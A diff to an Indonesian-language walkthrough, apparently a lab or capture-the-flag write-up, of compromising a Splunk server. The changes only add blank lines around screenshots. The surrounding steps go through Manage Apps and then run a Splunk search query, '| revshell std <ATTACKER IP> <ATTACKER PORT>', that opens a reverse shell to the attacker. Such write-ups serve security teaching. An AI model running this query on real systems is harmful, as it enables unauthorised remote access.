@@ -326,8 +326,11 @@ sekarang kita coba login menggunakan username dan password yang sudah kita dapat
 disini aku explore halaman tersebut, dan aku menemukan ada menu `Manage App` dengan langkah langkah seperti berikut:
 
 1. Klik menu `Apps`
+
 ![alt text](img/apps.png)
+
 2. Klik `Manage Apps`
+
 ![alt text](img/manage-apps.png)
 
 kemudian akan mendapatkan halaman seperti berikut:
@@ -357,7 +360,9 @@ sekarang waktunya kita masuk ke Search & Reporting untuk menjalankan payload ter
 ### Fourth Steps - Road to Root
 
 1. Klik menu `Search & Reporting`
+
 ![search-report](img/searchreport.png)
+
 2. Masukkan query berikut pada kolom search
 ```bash
 | revshell std <ATTACKER IP> <ATTACKER PORT>
